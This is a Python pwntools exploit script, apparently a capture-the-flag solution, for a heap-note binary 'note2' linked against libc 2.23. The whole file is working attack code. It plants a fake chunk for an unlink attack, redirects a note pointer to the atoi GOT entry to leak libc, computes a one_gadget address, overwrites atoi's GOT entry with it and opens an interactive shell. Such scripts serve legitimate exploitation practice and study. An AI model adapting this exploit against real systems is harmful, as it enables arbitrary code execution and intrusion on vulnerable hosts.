import pwn as p

target = p.process('./note2', env={'LD_PRELOAD': './libc-2.23.so'})
# p.gdb.attach(target, gdbscript='b *0x00400d41')

elf = p.ELF('note2')
libc = p.ELF('libc-2.23.so')

# methods to stop making pwn whine about bytes


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def wait_for(msg: str) -> None:
    print(s(target.recvuntil(b(msg))), end='')


def new_note(len: int, data: bytes) -> None:
    wait_for('option--->>\n')
    target.sendline(b'1')
    wait_for('Input the length of the note content:(less than 128)\n')
    target.sendline(b(str(len)))
    wait_for('Input the note content:\n')
    target.sendline(data)


def show_note(index) -> int:
    wait_for('option--->>\n')
    target.sendline(b'2')
    wait_for('Input the id of the note:\n')
    target.sendline(b(str(index)))
    print(s(target.recvuntil(b'Content is ')))
    leak = target.recvline().strip(b'\x0a')
    leak = p.u64(leak+b'\x00'*(8-len(leak)))
    print(hex(leak))
    return leak


def edit_note(index, flag_overwrite, data: bytes) -> None:
    '''
    params:
        flag_overwrite: 1 to overwrite, 2 to append
    '''
    wait_for('option--->>\n')
    target.sendline(b'3')
    wait_for('Input the id of the note:\n')
    target.sendline(b(str(index)))
    wait_for('/2.append]\n')
    target.sendline(b(str(flag_overwrite)))
    wait_for('TheNewContents:')
    target.sendline(data)
    target.sendline()


def delete_note(index) -> None:
    wait_for('option--->>\n')
    target.sendline(b'4')
    wait_for('Input the id of the note:\n')
    target.sendline(b(str(index)))


def quit() -> None:
    wait_for('option--->>\n')
    target.sendline(b'5')


def init() -> None:
    wait_for('Input your name:\n')
    target.sendline(b'name')
    wait_for('Input your address:\n')
    target.sendline(b'address')


init()

buffer_ptr_base = 0x00602120

fake_chunk = b''
fake_chunk += p.p64(0x0)  # previous size
fake_chunk += p.p64(0xa0)  # size
fake_chunk += p.p64(buffer_ptr_base - 0x8*3)  # fd
fake_chunk += p.p64(buffer_ptr_base - 0x8*2)  # bk
fake_chunk += p.p64(0x0)  # fd_nextsize, to avoid checks

new_note(0x80, fake_chunk)  # id 0

new_note(0x0, b'1'*0x8)  # id 1

new_note(0x80, b'2'*(0x80-1))  # id 2

delete_note(1)

new_note(0x0, b'5'*0x10 + p.p64(0xa0) + p.p64(0x90))  # id 1 (?)

delete_note(2)  # unlink attack

print('atoi', p.p64(elf.got['atoi']))
edit_note(0, 1, b'6'*24 + p.p64(elf.got['atoi']))

atoi_leak = show_note(0)
libc_base = atoi_leak - libc.symbols['atoi']

gadget_addr = libc_base + 0xf1147

print(f'gadget ({hex(gadget_addr)}) to be sent...')
edit_note(0, 1, p.p64(gadget_addr))
print('gadget sent')

target.interactive()
